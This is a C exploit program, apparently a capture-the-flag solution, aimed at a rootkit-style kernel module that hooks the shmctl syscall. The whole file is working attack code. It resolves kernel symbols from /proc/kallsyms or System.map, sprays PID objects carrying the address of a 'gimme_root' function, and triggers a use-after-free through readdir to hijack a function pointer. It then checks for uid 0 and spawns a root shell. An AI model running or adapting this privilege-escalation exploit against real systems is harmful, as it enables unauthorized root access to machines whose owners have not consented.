#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/utsname.h>

#define AUTH_TOKEN 0x77617363
#define __NR_shmctl 31
#define FILE_NAME ""

#define HIDE_PID    1
#define UNHIDE_PID  2
#define HIDE_FILE   3
#define UNHIDE_FILE 4
#define DEBUG       5

struct pid_args {
    long pid_start;
    long pid_end;
};

struct file_args {
    char *name;
    int len;
};

void error ( char *msg )
{
    perror(msg);
    exit(EXIT_FAILURE);
}

/* thanks spender... */
unsigned long get_kernel_sym(char *name)
{
        FILE *f;
        unsigned long addr;
        char dummy;
        char sname[512];
        struct utsname ver;
        int ret;
        int rep = 0;
        int oldstyle = 0;

        f = fopen("/proc/kallsyms", "r");
        if (f == NULL) {
                f = fopen("/proc/ksyms", "r");
                if (f == NULL)
                        goto fallback;
                oldstyle = 1;
        }

repeat:
        ret = 0;
        while(ret != EOF) {
                if (!oldstyle)
                        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
                else {
                        ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
                        if (ret == 2) {
                                char *p;
                                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                                        continue;
                                p = strrchr(sname, '_');
                                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                                        p = p - 4;
                                        while (p > (char *)sname && *(p - 1) == '_')
                                                p--;
                                        *p = '\0';
                                }
                        }
                }
                if (ret == 0) {
                        fscanf(f, "%s\n", sname);
                        continue;
                }
                if (!strcmp(name, sname)) {
                        fprintf(stdout, "[+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
                        fclose(f);
                        return addr;
                }
        }

        fclose(f);
        if (rep)
                return 0;
fallback:
        uname(&ver);
        if (strncmp(ver.release, "2.6", 3))
                oldstyle = 1;
        sprintf(sname, "/boot/System.map-%s", ver.release);
        f = fopen(sname, "r");
        if (f == NULL)
                return 0;
        rep = 1;
        goto repeat;
}

int main ( int argc, char *argv[] )
{
    int fd, ret, i;
    long debug;
    unsigned long gimme_root;
    DIR *dir;
    struct file_args file_args;
    struct pid_args pid_args;

    gimme_root = get_kernel_sym("gimme_root");
    if ( 0 == gimme_root )
    {
        printf("[-] Failed to resolve gimme_root\n");
        exit(EXIT_FAILURE);
    }

    /* Enable debugging */

    printf("[+] Enabling debugging...\n");

    debug = 1;

    ret = syscall(__NR_shmctl, AUTH_TOKEN, DEBUG, &debug);
    if ( ret < 0 )
        error("[-] shmctl");

    /* Hide file */

    printf("[+] Hiding file...\n");

    memset(&file_args, 0, sizeof(file_args));
    file_args.name = FILE_NAME;
    file_args.len = strlen(FILE_NAME);

    ret = syscall(__NR_shmctl, AUTH_TOKEN, HIDE_FILE, &file_args);
    if ( ret < 0 )
        error("[-] shmctl");

    /* Unhide file */

    printf("[+] Unhiding file...\n");

    memset(&file_args, 0, sizeof(file_args));
    file_args.name = FILE_NAME;
    file_args.len = strlen(FILE_NAME);

    ret = syscall(__NR_shmctl, AUTH_TOKEN, UNHIDE_FILE, &file_args);
    if ( ret < 0 )
        error("[-] shmctl");

    /* Spray PID objects... whatever */

    printf("[+] Spraying PID objects...\n");

    memset(&pid_args, 0, sizeof(pid_args));
    pid_args.pid_start = gimme_root;
    pid_args.pid_end = (long)&FILE_NAME;

    for ( i = 0; i < 5000; i++ )
    {
        ret = syscall(__NR_shmctl, AUTH_TOKEN, HIDE_PID, &pid_args);
        if ( ret < 0 )
            error("[-] shmctl");
    }

    /* Trigger UAF function pointer */

    printf("[+] Triggering UAF...\n");

    dir = opendir(".");
    if ( NULL == dir )
        error("[-] opendir");

    readdir(dir);

    /* Check if root */

    if ( getuid() )
    {
        printf("[-] Failed to get root\n");
        exit(EXIT_FAILURE);
    }
    else
        printf("[+] Got root!\n");

    printf("[+] Enjoy your shell...\n");

    if ( execl("/system/bin/sh", "sh", NULL) < 0 )
        error("[-] execl");

    return 0;
}
